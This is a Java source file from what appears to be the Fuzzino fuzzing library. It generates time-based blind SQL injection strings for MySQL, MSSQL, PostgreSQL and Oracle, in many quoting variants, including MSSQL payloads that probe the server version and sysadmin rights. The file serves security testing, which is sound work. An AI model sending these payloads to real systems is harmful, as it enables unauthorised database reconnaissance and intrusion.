package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string.data;

public class SQLTimeBasedInjections extends StringContainer {
	
	private static final long BASE_TIME_IN_S = 1;
	// TODO test how much time is consumed by the benchmark method
	private static final long BASE_EXECUTION_REPITITIONS = 10000000;
	private static final int[] MULTIPLICATORS = {1, 2, 4, 8};
	
	public static final SQLTimeBasedInjections INSTANCE = new SQLTimeBasedInjections();

	private SQLTimeBasedInjections() {
		super();
	}

	@Override
	protected void initValues() {
		// Add SQL injection commands with different time lengths
		for (int multiplicator : MULTIPLICATORS) {
			addValues(multiplicator);
		}
	}

	public void addValues(int multiplicator) {
		long timeInS = BASE_TIME_IN_S * multiplicator;
		long executionRepititions = BASE_EXECUTION_REPITITIONS * multiplicator;
		
		add("sleep(" + timeInS + ")#");
		add("1 or sleep(" + timeInS + ")#");
		add("\" or sleep(" + timeInS + ")#");
		add("' or sleep(" + timeInS + ")#");
		add("\" or sleep(" + timeInS + ")=\"");
		add("' or sleep(" + timeInS + ")='");
		add("1) or sleep(" + timeInS + ")#");
		add("\") or sleep(" + timeInS + ")=\"");
		add("') or sleep(" + timeInS + ")='");
		add("1)) or sleep(" + timeInS + ")#");
		add("\")) or sleep(" + timeInS + ")=\"");
		add("')) or sleep(" + timeInS + ")='");
		add(";waitfor delay '0:0:" + timeInS + "'--");
		add(");waitfor delay '0:0:" + timeInS + "'--");
		add("';waitfor delay '0:0:" + timeInS + "'--");
		add("\";waitfor delay '0:0:" + timeInS + "'--");
		add("');waitfor delay '0:0:" + timeInS + "'--");
		add("\");waitfor delay '0:0:" + timeInS + "'--");
		add("));waitfor delay '0:0:" + timeInS + "'--");
		add("'));waitfor delay '0:0:" + timeInS + "'--");
		add("\"));waitfor delay '0:0:" + timeInS + "'--");
		add("benchmark(" + executionRepititions + ",MD5(1))#");
		add("1 or benchmark(" + executionRepititions + ",MD5(1))#");
		add("\" or benchmark(" + executionRepititions + ",MD5(1))#");
		add("' or benchmark(" + executionRepititions + ",MD5(1))#");
		add("1) or benchmark(" + executionRepititions + ",MD5(1))#");
		add("\") or benchmark(" + executionRepititions + ",MD5(1))#");
		add("') or benchmark(" + executionRepititions + ",MD5(1))#");
		add("1)) or benchmark(" + executionRepititions + ",MD5(1))#");
		add("\")) or benchmark(" + executionRepititions + ",MD5(1))#");
		add("')) or benchmark(" + executionRepititions + ",MD5(1))#");
		add("pg_sleep(" + timeInS + ")--");
		add("1 or pg_sleep(" + timeInS + ")--");
		add("\" or pg_sleep(" + timeInS + ")--");
		add("' or pg_sleep(" + timeInS + ")--");
		add("1) or pg_sleep(" + timeInS + ")--");
		add("\") or pg_sleep(" + timeInS + ")--");
		add("') or pg_sleep(" + timeInS + ")--");
		add("1)) or pg_sleep(" + timeInS + ")--");
		add("\")) or pg_sleep(" + timeInS + ")--");
		add("')) or pg_sleep(" + timeInS + ")--");
		add("'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:" + timeInS + "' --");
		add("'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:" + timeInS + "' --");
		add("'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:" + timeInS + "' --");
		add("'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:" + timeInS + "' --");
		add("'; if not(select system_user) <> 'sa' waitfor delay '0:0:" + timeInS + "' --");
		add("'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:" + timeInS + "' -- ");
		add("'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:" + timeInS + "' --");
		add("'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:" + timeInS + "' --");
		add(";dbms_lock.sleep(" + timeInS + ");--");
		add("';dbms_lock.sleep(" + timeInS + ");--");
		add("\";dbms_lock.sleep(" + timeInS + ");--");
		add("');dbms_lock.sleep(" + timeInS + ");--");
		add("\");dbms_lock.sleep(" + timeInS + ");--");
		add("));dbms_lock.sleep(" + timeInS + ");--");
		add("'));dbms_lock.sleep(" + timeInS + ");--");
		add("\");dbms_lock.sleep(" + timeInS + ");--");
		add(";apex_util.pause(" + timeInS + ");--");
		add("';apex_util.pause(" + timeInS + ");--");
		add("\";apex_util.pause(" + timeInS + ");--");
		add("');apex_util.pause(" + timeInS + ");--");
		add("\");apex_util.pause(" + timeInS + ");--");
		add("));apex_util.pause(" + timeInS + ");--");
		add("'));apex_util.pause(" + timeInS + ");--");
		add("\");apex_util.pause(" + timeInS + ");--");
	}
	
}
